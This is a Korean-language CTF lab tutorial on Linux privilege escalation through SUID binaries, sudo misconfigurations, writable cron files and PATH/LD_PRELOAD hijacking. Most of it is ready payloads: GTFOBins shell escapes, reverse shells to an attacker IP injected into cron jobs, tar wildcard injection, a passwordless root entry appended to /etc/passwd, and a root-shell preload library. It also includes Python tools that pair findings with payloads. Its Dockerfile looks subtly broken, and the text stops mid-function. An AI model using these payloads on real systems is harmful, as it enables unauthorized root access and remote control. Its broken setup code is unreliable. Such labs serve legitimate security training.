# 리눅스 CTF 실습 랩 — 권한상승·SUID·Cron·환경변수 종합

## 1. 실습 환경

### 1.1 Docker 기반 취약 환경 구축

```bash
# 취약 실습 환경 Dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    gcc \
    sudo \
    cron \
    python3 \
    python3-pip \
    vim \
    net-tools \
    find \
    && rm -rf /var/lib/apt/lists/*

# 취약 사용자 계층 생성
RUN useradd -m -s /bin/bash ctfuser && \
    useradd -m -s /bin/bash developer && \
    echo "ctfuser:ctfpass" | chpasswd && \
    echo "developer:devpass" | chpasswd

# 취약 SUID 바이너리 생성
COPY vuln_suid.c /tmp/
RUN gcc -o /usr/local/bin/vuln_suid /tmp/vuln_suid.c && \
    chmod 4755 /usr/local/bin/vuln_suid

# 취약 sudo 설정
RUN echo "ctfuser ALL=(root) NOPASSWD: /usr/bin/find" >> /etc/sudoers

# 취약 Cron 설정
RUN chmod 777 /etc/cron.d/
RUN echo "* * * * * root /opt/backup.sh" > /etc/cron.d/backup && \
    chmod 777 /opt/backup.sh

WORKDIR /home/ctfuser
USER ctfuser
```

```bash
# 컨테이너 빌드 및 실행
docker build -t linux-ctf-lab .
docker run -it --name ctf-env linux-ctf-lab /bin/bash

# 또는 기존 취약 환경 이미지 활용
docker run -it --rm \
    --cap-add=SYS_PTRACE \
    --security-opt seccomp=unconfined \
    ubuntu:20.04 /bin/bash
```

### 1.2 권한 상승 벡터 분류표

| 벡터 유형 | 탐지 명령어 | 위험도 | 성공률 |
|-----------|-------------|--------|--------|
| SUID 바이너리 남용 | `find / -perm -4000 2>/dev/null` | 높음 | 매우 높음 |
| sudo 미스설정 | `sudo -l` | 높음 | 높음 |
| Cron 파일 쓰기 권한 | `ls -la /etc/cron*` | 중간 | 높음 |
| 환경변수 PATH 하이재킹 | `echo $PATH; strings <binary>` | 중간 | 중간 |
| 커널 취약점 | `uname -a; searchsploit` | 최고 | 낮음 |
| 쓰기 가능 /etc/passwd | `ls -la /etc/passwd` | 최고 | 매우 높음 |
| NFS no_root_squash | `cat /etc/exports` | 높음 | 높음 |
| 쓰기 가능 서비스 파일 | `find / -name "*.service" -writable` | 높음 | 중간 |
| Capabilities 남용 | `getcap -r / 2>/dev/null` | 높음 | 높음 |
| Docker 소켓 접근 | `ls -la /var/run/docker.sock` | 최고 | 매우 높음 |

### 1.3 초기 열거 체크리스트

```bash
# 시스템 기본 정보
id && whoami
uname -a
cat /etc/os-release
hostname

# 네트워크 정보
ip addr
netstat -tulnp 2>/dev/null || ss -tulnp
cat /etc/hosts

# 사용자 정보
cat /etc/passwd | grep -v nologin
cat /etc/group
last
w

# 실행 중인 프로세스
ps aux
ps auxf

# 환경변수
env
printenv
```

---

## 2. CTF 문제 1: SUID 바이너리 남용

### 2.1 SUID 파일 탐색

```bash
# 기본 SUID 탐색
find / -perm -4000 -type f 2>/dev/null

# 더 상세한 탐색 (소유자 포함)
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# SGID 포함 탐색
find / -perm /6000 -type f 2>/dev/null

# root 소유 SUID만 필터링
find / -user root -perm -4000 -type f 2>/dev/null

# 결과 예시
# -rwsr-xr-x 1 root root 44784 /usr/bin/passwd
# -rwsr-xr-x 1 root root 55528 /usr/bin/mount
# -rwsr-xr-x 1 root root 31032 /usr/local/bin/vuln_suid  <-- 수상
```

### 2.2 GTFOBins 활용 전략표

| 바이너리 | SUID 익스플로잇 방법 | 명령어 예시 |
|----------|---------------------|-------------|
| `find` | -exec 플래그로 쉘 실행 | `find . -exec /bin/sh -p \; -quit` |
| `vim` | shell 명령 실행 | `vim -c ':!/bin/sh'` |
| `python3` | os.setuid 후 쉘 | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `perl` | POSIX 모듈 활용 | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` |
| `bash` | -p 플래그 | `bash -p` |
| `cp` | /etc/passwd 덮어쓰기 | `cp /tmp/malicious_passwd /etc/passwd` |
| `tee` | 파일 쓰기 | `echo "root2::0:0:root:/root:/bin/bash" | tee -a /etc/passwd` |
| `less` | 쉘 탈출 | `less /etc/passwd` → `!sh` |
| `awk` | BEGIN 블록 | `awk 'BEGIN {system("/bin/sh")}'` |
| `nmap` | interactive 모드 | `nmap --interactive` → `!sh` |
| `env` | 환경 실행 | `env /bin/sh -p` |
| `strace` | 명령 추적 래핑 | `strace -o /dev/null /bin/sh -p` |

### 2.3 Python CLI: SUID 바이너리 분석기

```python
#!/usr/bin/env python3
"""SUID 바이너리 분석기 — GTFOBins DB와 교차 분석하여 익스플로잇 경로 제시."""

import argparse
import json
import os
import stat
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class SuidBinary:
    path: str
    owner: str
    permissions: str
    size: int
    gtfobins_entry: dict | None = None


@dataclass
class AnalysisResult:
    total_found: int
    exploitable: list[SuidBinary] = field(default_factory=list)
    unknown: list[SuidBinary] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)


def find_suid_binaries(search_path: str) -> list[str]:
    """지정 경로에서 SUID 비트가 설정된 파일 목록 반환."""
    result = subprocess.run(
        ["find", search_path, "-perm", "-4000", "-type", "f"],
        capture_output=True,
        text=True,
        timeout=60,
    )
    paths = [p.strip() for p in result.stdout.splitlines() if p.strip()]
    return paths


def get_file_info(filepath: str) -> SuidBinary | None:
    """파일 통계 정보를 SuidBinary 객체로 반환."""
    try:
        st = os.stat(filepath)
        perms = oct(st.st_mode)[-4:]
        owner = subprocess.run(
            ["stat", "-c", "%U", filepath],
            capture_output=True,
            text=True,
        ).stdout.strip()
        return SuidBinary(
            path=filepath,
            owner=owner,
            permissions=perms,
            size=st.st_size,
        )
    except (OSError, PermissionError) as e:
        return None


def load_gtfobins_db(db_path: str) -> dict:
    """GTFOBins JSON DB 로드. 파일 없으면 내장 기본 DB 반환."""
    if db_path and Path(db_path).exists():
        with open(db_path, encoding="utf-8") as f:
            return json.load(f)

    # 내장 기본 DB (핵심 바이너리)
    return {
        "find": {
            "suid": "find . -exec /bin/sh -p \\; -quit",
            "description": "-exec 플래그로 SUID 권한 유지 쉘 실행",
        },
        "vim": {
            "suid": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "description": "Python 플러그인으로 SUID 쉘 획득",
        },
        "python3": {
            "suid": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            "description": "setuid(0) 호출 후 쉘 실행",
        },
        "python": {
            "suid": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            "description": "setuid(0) 호출 후 쉘 실행",
        },
        "perl": {
            "suid": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
            "description": "POSIX setuid 후 쉘 실행",
        },
        "bash": {
            "suid": "bash -p",
            "description": "-p 플래그로 effective UID 유지",
        },
        "sh": {
            "suid": "sh -p",
            "description": "-p 플래그로 effective UID 유지",
        },
        "cp": {
            "suid": "cp /etc/passwd /tmp/passwd.bak && echo 'pwned::0:0::/root:/bin/sh' >> /etc/passwd",
            "description": "/etc/passwd 쓰기 권한 악용",
        },
        "tee": {
            "suid": "echo 'pwned::0:0::/root:/bin/sh' | tee -a /etc/passwd",
            "description": "tee로 /etc/passwd 추가",
        },
        "awk": {
            "suid": "awk 'BEGIN {system(\"/bin/sh\")}'",
            "description": "BEGIN 블록에서 쉘 실행",
        },
        "less": {
            "suid": "less /etc/passwd  # 진입 후 !sh 입력",
            "description": "less 내부 쉘 탈출",
        },
        "more": {
            "suid": "more /etc/passwd  # 진입 후 !sh 입력",
            "description": "more 내부 쉘 탈출",
        },
        "nmap": {
            "suid": "nmap --interactive  # 진입 후 !sh 입력",
            "description": "nmap interactive 모드 쉘 탈출",
        },
        "env": {
            "suid": "env /bin/sh -p",
            "description": "env로 -p 옵션 쉘 실행",
        },
        "strace": {
            "suid": "strace -o /dev/null /bin/sh -p",
            "description": "strace 래핑으로 SUID 쉘",
        },
    }


def analyze(
    search_path: str,
    gtfobins_db_path: str,
    output_path: str | None,
) -> AnalysisResult:
    """SUID 바이너리 분석 메인 로직."""
    db = load_gtfobins_db(gtfobins_db_path)
    suid_paths = find_suid_binaries(search_path)
    result = AnalysisResult(total_found=len(suid_paths))

    for filepath in suid_paths:
        binary = get_file_info(filepath)
        if binary is None:
            result.errors.append(f"접근 실패: {filepath}")
            continue

        binary_name = Path(filepath).name
        if binary_name in db:
            binary.gtfobins_entry = db[binary_name]
            result.exploitable.append(binary)
        else:
            result.unknown.append(binary)

    return result


def format_report(result: AnalysisResult) -> str:
    """분석 결과를 사람이 읽기 쉬운 형식으로 포맷."""
    lines: list[str] = []
    lines.append("=" * 60)
    lines.append("SUID 바이너리 분석 결과")
    lines.append("=" * 60)
    lines.append(f"총 발견된 SUID 파일: {result.total_found}개")
    lines.append(f"익스플로잇 가능: {len(result.exploitable)}개")
    lines.append(f"DB 미등재 (수동 분석 필요): {len(result.unknown)}개")
    lines.append("")

    if result.exploitable:
        lines.append("[!] 익스플로잇 가능한 SUID 바이너리")
        lines.append("-" * 40)
        for b in result.exploitable:
            lines.append(f"  파일: {b.path}")
            lines.append(f"  소유자: {b.owner} | 권한: {b.permissions} | 크기: {b.size}B")
            if b.gtfobins_entry:
                lines.append(f"  설명: {b.gtfobins_entry['description']}")
                lines.append(f"  익스플로잇: {b.gtfobins_entry['suid']}")
            lines.append("")

    if result.unknown:
        lines.append("[?] 수동 분석 필요 바이너리")
        lines.append("-" * 40)
        for b in result.unknown:
            lines.append(f"  파일: {b.path} (소유자: {b.owner})")
        lines.append("")

    if result.errors:
        lines.append("[x] 오류")
        for err in result.errors:
            lines.append(f"  {err}")

    return "\n".join(lines)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SUID 바이너리 분석기 — GTFOBins DB와 교차 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  %(prog)s --path /
  %(prog)s --path /usr --gtfobins-db /opt/gtfobins.json
  %(prog)s --path / --output /tmp/suid_report.txt
        """,
    )
    parser.add_argument(
        "--path",
        default="/",
        help="SUID 탐색 시작 경로 (기본값: /)",
    )
    parser.add_argument(
        "--gtfobins-db",
        default="",
        help="GTFOBins JSON DB 파일 경로 (미지정 시 내장 DB 사용)",
    )
    parser.add_argument(
        "--output",
        default="",
        help="결과 저장 파일 경로 (미지정 시 stdout 출력)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    print(f"[*] 탐색 경로: {args.path}")
    print("[*] SUID 바이너리 수집 중...")

    result = analyze(
        search_path=args.path,
        gtfobins_db_path=args.gtfobins_db,
        output_path=args.output,
    )

    report = format_report(result)

    if args.output:
        Path(args.output).write_text(report, encoding="utf-8")
        print(f"[+] 결과 저장 완료: {args.output}")
    else:
        print(report)


if __name__ == "__main__":
    main()
```

---

## 3. CTF 문제 2: sudo 미스설정 익스플로잇

### 3.1 sudo -l 분석 및 권한 상승 경로

```bash
# sudo 권한 확인
sudo -l

# 예시 출력
# User ctfuser may run the following commands on target:
#     (root) NOPASSWD: /usr/bin/find
#     (root) NOPASSWD: /usr/bin/less
#     (ALL : ALL) /usr/bin/apt-get
#     (root) /usr/bin/vim /var/log/syslog

# sudoers 파일 직접 확인 (권한이 있을 경우)
cat /etc/sudoers
ls /etc/sudoers.d/
```

### 3.2 NOPASSWD 설정 남용 시나리오

```bash
# 시나리오 1: find NOPASSWD
sudo find /etc/passwd -exec /bin/sh \;

# 시나리오 2: vim으로 특정 파일 편집 허용 → 쉘 탈출
sudo vim /var/log/syslog
# vim 내부에서: :!/bin/bash

# 시나리오 3: apt-get 허용
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# 시나리오 4: less 허용
sudo less /etc/passwd
# less 내부: !sh

# 시나리오 5: 와일드카드 활용
# sudoers: (root) NOPASSWD: /opt/scripts/*.sh
# 악용:
echo '#!/bin/bash\n/bin/bash -i' > /opt/scripts/evil.sh
chmod +x /opt/scripts/evil.sh
sudo /opt/scripts/evil.sh
```

### 3.3 Python CLI: sudo 권한 분석기

```python
#!/usr/bin/env python3
"""sudo 권한 분석기 — sudoers 파일 파싱 및 익스플로잇 경로 제시."""

import argparse
import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class SudoRule:
    user: str
    run_as: str
    nopasswd: bool
    commands: list[str]
    raw: str


@dataclass
class ExploitPath:
    command: str
    method: str
    payload: str
    severity: str


# GTFOBins sudo 익스플로잇 DB (내장)
SUDO_EXPLOITS: dict[str, ExploitPath] = {
    "find": ExploitPath(
        command="find",
        method="exec 플래그",
        payload="sudo find /tmp -exec /bin/bash \\; -quit",
        severity="critical",
    ),
    "vim": ExploitPath(
        command="vim",
        method="내부 쉘",
        payload="sudo vim -c ':!/bin/bash'",
        severity="critical",
    ),
    "less": ExploitPath(
        command="less",
        method="쉘 탈출",
        payload="sudo less /etc/passwd  # 진입 후 !bash",
        severity="high",
    ),
    "awk": ExploitPath(
        command="awk",
        method="BEGIN 실행",
        payload="sudo awk 'BEGIN {system(\"/bin/bash\")}'",
        severity="critical",
    ),
    "python3": ExploitPath(
        command="python3",
        method="os.system",
        payload="sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
        severity="critical",
    ),
    "python": ExploitPath(
        command="python",
        method="os.system",
        payload="sudo python -c 'import os; os.system(\"/bin/bash\")'",
        severity="critical",
    ),
    "perl": ExploitPath(
        command="perl",
        method="exec",
        payload="sudo perl -e 'exec \"/bin/bash\"'",
        severity="critical",
    ),
    "ruby": ExploitPath(
        command="ruby",
        method="exec",
        payload="sudo ruby -e 'exec \"/bin/bash\"'",
        severity="critical",
    ),
    "php": ExploitPath(
        command="php",
        method="system",
        payload="sudo php -r 'system(\"/bin/bash\");'",
        severity="critical",
    ),
    "nmap": ExploitPath(
        command="nmap",
        method="interactive",
        payload="sudo nmap --interactive  # !bash",
        severity="high",
    ),
    "apt-get": ExploitPath(
        command="apt-get",
        method="Pre-Invoke",
        payload="sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash",
        severity="critical",
    ),
    "cp": ExploitPath(
        command="cp",
        method="/etc/passwd 덮어쓰기",
        payload="echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
        severity="critical",
    ),
}


def get_sudo_rules_from_command(user: str) -> list[str]:
    """sudo -l 명령으로 현재 사용자의 sudo 규칙 가져오기."""
    try:
        result = subprocess.run(
            ["sudo", "-l", "-U", user],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.stdout.splitlines()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []


def parse_sudoers_file(filepath: str) -> list[SudoRule]:
    """sudoers 파일 파싱하여 SudoRule 목록 반환."""
    rules: list[SudoRule] = []
    if not Path(filepath).exists():
        return rules

    content = Path(filepath).read_text(encoding="utf-8", errors="ignore")
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # 기본 sudoers 규칙 패턴: user host=(run_as) [NOPASSWD:] commands
        match = re.match(
            r"^(\w+)\s+\S+\s*=\s*\((.+?)\)\s*(NOPASSWD:\s*)?(.+)$",
            line,
        )
        if match:
            user, run_as, nopasswd_str, cmds_str = match.groups()
            commands = [c.strip() for c in cmds_str.split(",")]
            rules.append(
                SudoRule(
                    user=user,
                    run_as=run_as.strip(),
                    nopasswd=bool(nopasswd_str),
                    commands=commands,
                    raw=line,
                )
            )

    return rules


def find_exploit_paths(rules: list[SudoRule]) -> list[tuple[SudoRule, ExploitPath]]:
    """sudo 규칙에서 익스플로잇 가능한 경로 탐색."""
    findings: list[tuple[SudoRule, ExploitPath]] = []

    for rule in rules:
        for cmd in rule.commands:
            binary_name = Path(cmd.split()[0]).name
            if binary_name in SUDO_EXPLOITS:
                findings.append((rule, SUDO_EXPLOITS[binary_name]))

    return findings


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="sudo 권한 분석기 — sudoers 파일 파싱 및 익스플로잇 경로 제시",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  %(prog)s --sudoers-file /etc/sudoers
  %(prog)s --user ctfuser
  %(prog)s --sudoers-file /etc/sudoers --user developer
        """,
    )
    parser.add_argument(
        "--sudoers-file",
        default="",
        help="분석할 sudoers 파일 경로",
    )
    parser.add_argument(
        "--user",
        default="",
        help="분석할 사용자명 (sudo -l로 현재 규칙 조회)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    if not args.sudoers_file and not args.user:
        print("[-] --sudoers-file 또는 --user 중 하나는 필수입니다.")
        raise SystemExit(1)

    rules: list[SudoRule] = []

    if args.sudoers_file:
        print(f"[*] sudoers 파일 분석: {args.sudoers_file}")
        rules = parse_sudoers_file(args.sudoers_file)
        print(f"[*] {len(rules)}개 규칙 발견")

    if args.user:
        print(f"[*] 사용자 '{args.user}' sudo 권한 조회 중...")
        lines = get_sudo_rules_from_command(args.user)
        for line in lines:
            print(f"    {line}")

    findings = find_exploit_paths(rules)

    print("\n" + "=" * 60)
    print("익스플로잇 경로 분석 결과")
    print("=" * 60)

    if not findings:
        print("[*] 즉시 익스플로잇 가능한 경로를 찾지 못했습니다.")
        print("[*] 수동으로 ALL, NOPASSWD 조합 등을 확인하세요.")
        return

    for rule, exploit in findings:
        print(f"\n[!] 위험 규칙 발견!")
        print(f"    사용자: {rule.user} → {rule.run_as}")
        print(f"    NOPASSWD: {'예' if rule.nopasswd else '아니오'}")
        print(f"    취약 명령: {exploit.command}")
        print(f"    방법: {exploit.method}")
        print(f"    심각도: {exploit.severity.upper()}")
        print(f"    페이로드: {exploit.payload}")


if __name__ == "__main__":
    main()
```

---

## 4. CTF 문제 3: 쓰기 가능한 Cron 파일 남용

### 4.1 /etc/cron* 쓰기 권한 탐색

```bash
# cron 관련 파일/디렉토리 권한 확인
ls -la /etc/cron*
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# 쓰기 가능한 cron 파일 탐색
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# 실행 중인 cron 작업 확인
cat /etc/crontab
crontab -l

# world-writable cron 스크립트 탐색
find /etc/cron.d/ -perm -o+w 2>/dev/null
find /etc/cron.daily/ -perm -o+w 2>/dev/null
find /etc/cron.weekly/ -perm -o+w 2>/dev/null

# 와일드카드 취약점 확인
cat /etc/crontab | grep "\*"
```

### 4.2 역방향 쉘 삽입 절차

```bash
# 단계 1: 쓰기 가능한 cron 스크립트 확인
ls -la /etc/cron.d/backup  # 쓰기 권한 확인

# 단계 2: 리버스 쉘 페이로드 준비 (공격자 IP: 10.10.10.100)
ATTACKER_IP="10.10.10.100"
ATTACKER_PORT="4444"

# 단계 3: cron 스크립트에 리버스 쉘 추가
echo "bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1" >> /opt/backup.sh

# 또는 cron.d 파일에 직접 추가
echo "* * * * * root bash -i >& /dev/tcp/10.10.10.100/4444 0>&1" > /etc/cron.d/evil

# 단계 4: 공격자 서버에서 리스너 실행
nc -lvnp 4444

# 와일드카드 익스플로잇 (tar 명령 남용)
# crontab: * * * * * root tar czf /backup.tar.gz /data/*
cd /data
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=bash evil.sh'
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.100/4444 0>&1' > evil.sh
```

### 4.3 Python CLI: Cron 취약점 스캐너

```python
#!/usr/bin/env python3
"""Cron 취약점 스캐너 — 쓰기 권한, world-readable, 와일드카드 취약점 탐지."""

import argparse
import os
import re
import stat
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CronVulnerability:
    vuln_type: str
    path: str
    detail: str
    severity: str
    recommendation: str


@dataclass
class ScanResult:
    scan_path: str
    check_type: str
    vulnerabilities: list[CronVulnerability] = field(default_factory=list)
    scanned_files: int = 0


CRON_PATHS = [
    "/etc/crontab",
    "/etc/cron.d",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/etc/cron.hourly",
    "/var/spool/cron",
    "/var/spool/cron/crontabs",
]


def check_writable(path: str) -> list[CronVulnerability]:
    """쓰기 가능한 cron 파일/디렉토리 탐지."""
    vulns: list[CronVulnerability] = []
    scan_target = Path(path)

    targets: list[Path] = []
    if scan_target.is_dir():
        targets = list(scan_target.rglob("*"))
        targets.append(scan_target)
    elif scan_target.is_file():
        targets = [scan_target]
    else:
        for cp in CRON_PATHS:
            p = Path(cp)
            if p.exists():
                if p.is_dir():
                    targets.extend(p.rglob("*"))
                targets.append(p)

    for target in targets:
        try:
            file_stat = target.stat()
            mode = file_stat.st_mode

            # others 쓰기 가능 (o+w)
            if mode & stat.S_IWOTH:
                vulns.append(
                    CronVulnerability(
                        vuln_type="world-writable",
                        path=str(target),
                        detail=f"권한: {oct(mode)[-4:]} — 누구나 쓰기 가능",
                        severity="critical",
                        recommendation="chmod o-w 로 쓰기 권한 제거",
                    )
                )
            # group 쓰기 가능 (g+w)
            elif mode & stat.S_IWGRP:
                vulns.append(
                    CronVulnerability(
                        vuln_type="group-writable",
                        path=str(target),
                        detail=f"권한: {oct(mode)[-4:]} — 그룹 쓰기 가능",
                        severity="high",
                        recommendation="chmod g-w 로 그룹 쓰기 권한 제거",
                    )
                )
        except (PermissionError, OSError):
            pass

    return vulns


def check_world_readable(path: str) -> list[CronVulnerability]:
    """world-readable cron 파일 탐지 (민감 정보 노출 위험)."""
    vulns: list[CronVulnerability] = []
    targets: list[Path] = []

    scan_target = Path(path)
    if scan_target.is_dir():
        targets = list(scan_target.rglob("*"))
    elif scan_target.is_file():
        targets = [scan_target]

    for target in targets:
        if not target.is_file():
            continue
        try:
            file_stat = target.stat()
            mode = file_stat.st_mode
            if mode & stat.S_IROTH:
                # 파일 내용에 민감 정보 포함 여부 체크
                content = target.read_text(encoding="utf-8", errors="ignore")
                has_sensitive = any(
                    kw in content.lower()
                    for kw in ["password", "passwd", "secret", "token", "key"]
                )
                severity = "high" if has_sensitive else "low"
                vulns.append(
                    CronVulnerability(
                        vuln_type="world-readable",
                        path=str(target),
                        detail=f"권한: {oct(mode)[-4:]} | 민감 정보: {'있음' if has_sensitive else '없음'}",
                        severity=severity,
                        recommendation="chmod o-r 로 others 읽기 권한 제거",
                    )
                )
        except (PermissionError, OSError):
            pass

    return vulns


def check_wildcard(path: str) -> list[CronVulnerability]:
    """와일드카드 취약점이 있는 cron 명령 탐지."""
    vulns: list[CronVulnerability] = []
    # tar, rsync, chown, chmod 등 와일드카드 위험 명령
    dangerous_cmds = re.compile(
        r"(tar|rsync|chown|chmod|find|rm)\s+.*\*",
        re.IGNORECASE,
    )

    targets: list[Path] = []
    scan_target = Path(path)
    if scan_target.is_dir():
        targets = list(scan_target.rglob("*"))
    elif scan_target.is_file():
        targets = [scan_target]
    else:
        for cp in CRON_PATHS:
            p = Path(cp)
            if p.is_file():
                targets.append(p)
            elif p.is_dir():
                targets.extend(p.rglob("*"))

    for target in targets:
        if not target.is_file():
            continue
        try:
            content = target.read_text(encoding="utf-8", errors="ignore")
            for lineno, line in enumerate(content.splitlines(), 1):
                match = dangerous_cmds.search(line)
                if match:
                    cmd = match.group(1)
                    vulns.append(
                        CronVulnerability(
                            vuln_type="wildcard-injection",
                            path=f"{target}:{lineno}",
                            detail=f"위험 명령: {cmd} + 와일드카드 → 파일명 인젝션 가능\n    라인: {line.strip()}",
                            severity="high",
                            recommendation=f"{cmd} 호출 시 절대경로 또는 명시적 파일 목록 사용",
                        )
                    )
        except (PermissionError, OSError):
            pass

    return vulns


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Cron 취약점 스캐너 — 쓰기 권한, world-readable, 와일드카드 탐지",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  %(prog)s --check writable
  %(prog)s --scan-path /etc/cron.d --check writable
  %(prog)s --scan-path /etc/crontab --check wildcard
  %(prog)s --check all
        """,
    )
    parser.add_argument(
        "--scan-path",
        default="",
        help="스캔할 경로 (미지정 시 표준 cron 경로 전체 스캔)",
    )
    parser.add_argument(
        "--check",
        choices=["writable", "world-readable", "wildcard", "all"],
        default="all",
        help="점검 유형 선택 (기본값: all)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    scan_path = args.scan_path or "/"

    all_vulns: list[CronVulnerability] = []

    if args.check in ("writable", "all"):
        print("[*] 쓰기 권한 취약점 점검 중...")
        all_vulns.extend(check_writable(scan_path))

    if args.check in ("world-readable", "all"):
        print("[*] world-readable 취약점 점검 중...")
        all_vulns.extend(check_world_readable(scan_path))

    if args.check in ("wildcard", "all"):
        print("[*] 와일드카드 인젝션 취약점 점검 중...")
        all_vulns.extend(check_wildcard(scan_path))

    print("\n" + "=" * 60)
    print(f"Cron 취약점 스캔 결과 — 총 {len(all_vulns)}개 발견")
    print("=" * 60)

    for vuln in sorted(all_vulns, key=lambda v: v.severity):
        print(f"\n[{vuln.severity.upper()}] {vuln.vuln_type}")
        print(f"  경로: {vuln.path}")
        print(f"  상세: {vuln.detail}")
        print(f"  권고: {vuln.recommendation}")

    if not all_vulns:
        print("[+] 취약점이 발견되지 않았습니다.")


if __name__ == "__main__":
    main()
```

---

## 5. CTF 문제 4: 환경변수 PATH 하이재킹

### 5.1 상대경로 실행 취약점 탐지

```bash
# 바이너리에서 상대경로 명령 호출 확인
strings /usr/local/bin/vuln_binary | grep -v "/"
# 출력 예: service, ps, id, ls 등 절대경로 없이 실행하는 명령

# ltrace로 실행 추적
ltrace /usr/local/bin/vuln_binary 2>&1 | grep exec

# strace로 시스템 콜 확인
strace -e trace=execve /usr/local/bin/vuln_binary 2>&1

# PATH 환경변수 확인
echo $PATH

# PATH 하이재킹 익스플로잇
mkdir /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/service
echo '/bin/bash -p' >> /tmp/hijack/service
chmod +x /tmp/hijack/service

# PATH 앞에 삽입
export PATH=/tmp/hijack:$PATH
/usr/local/bin/vuln_binary  # → root 쉘 획득
```

### 5.2 LD_PRELOAD 남용 기법

```c
/* evil_lib.c — LD_PRELOAD로 로드될 악성 라이브러리 */
#include <stdio.h>
#include <unistd.h>

void __attribute__((constructor)) evil_init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
# 컴파일
gcc -shared -fPIC -o /tmp/evil.so evil_lib.c

# sudo로 LD_PRELOAD 허용 여부 확인
# env_keep += LD_PRELOAD 설정이 있으면 가능

# sudo와 함께 LD_PRELOAD 남용
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find

# SUID 바이너리에는 LD_PRELOAD가 무시됨 (보안 기능)
# 단, sudo의 env_keep 설정이 있으면 작동 가능
```

### 5.3 Python CLI: 환경변수 취약점 탐지기

```python
#!/usr/bin/env python3
"""환경변수 취약점 탐지기 — PATH 하이재킹 및 LD_PRELOAD 남용 경로 분석."""

import argparse
import os
import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class EnvVulnerability:
    vuln_type: str
    detail: str
    severity: str
    exploit_example: str


@dataclass
class BinaryAnalysis:
    binary_path: str
    relative_commands: list[str] = field(default_factory=list)
    ld_preload_vulnerable: bool = False
    vulnerabilities: list[EnvVulnerability] = field(default_factory=list)


def extract_relative_commands(binary_path: str) -> list[str]:
    """바이너리에서 strings로 상대경로 명령 추출."""
    try:
        result = subprocess.run(
            ["strings", binary_path],
            capture_output=True,
            text=True,
            timeout=10,
        )
    except FileNotFoundError:
        # strings 명령 없을 경우 직접 읽기
        try:
            with open(binary_path, "rb") as f:
                content = f.read()
            printable = re.findall(rb"[\x20-\x7e]{4,}", content)
            result_strings = [s.decode() for s in printable]
        except (OSError, PermissionError):
            return []
    else:
        result_strings = result.stdout.splitlines()

    # 알려진 시스템 명령 중 절대경로 없는 것 필터링
    known_commands = {
        "ls", "ps", "id", "whoami", "cat", "grep", "find",
        "service", "systemctl", "python", "python3", "perl",
        "awk", "sed", "curl", "wget", "nc", "netcat", "bash", "sh",
    }

    found: list[str] = []
    for s in result_strings:
        s = s.strip()
        # 슬래시 없는 단일 토큰이 알려진 명령이면 상대경로 실행 의심
        if s in known_commands:
            found.append(s)

    return list(set(found))


def check_ld_preload_vulnerability(binary_path: str) -> bool:
    """SUID 바이너리인 경우 LD_PRELOAD는 무시되므로 False 반환."""
    try:
        file_stat = os.stat(binary_path)
        import stat
        is_suid = bool(file_stat.st_mode & stat.S_ISUID)
        # SUID가 아닌 일반 실행 바이너리 + sudo env_keep이면 취약
        return not is_suid
    except OSError:
        return False


def parse_env_file(env_file: str) -> dict[str, str]:
    """환경변수 파일 파싱 (key=value 형식)."""
    env: dict[str, str] = {}
    if not env_file or not Path(env_file).exists():
        return env

    for line in Path(env_file).read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            key, _, val = line.partition("=")
            env[key.strip()] = val.strip()

    return env


def analyze_binary(
    binary_path: str,
    env_vars: dict[str, str],
) -> BinaryAnalysis:
    """바이너리 환경변수 취약점 종합 분석."""
    analysis = BinaryAnalysis(binary_path=binary_path)

    # 상대경로 명령 탐지
    rel_cmds = extract_relative_commands(binary_path)
    analysis.relative_commands = rel_cmds

    path_env = env_vars.get("PATH", os.environ.get("PATH", ""))

    if rel_cmds:
        # PATH 디렉토리 중 쓰기 가능한 것 확인
        writable_path_dirs: list[str] = []
        for path_dir in path_env.split(":"):
            if path_dir and Path(path_dir).is_dir():
                try:
                    if os.access(path_dir, os.W_OK):
                        writable_path_dirs.append(path_dir)
                except OSError:
                    pass

        if writable_path_dirs:
            for cmd in rel_cmds:
                analysis.vulnerabilities.append(
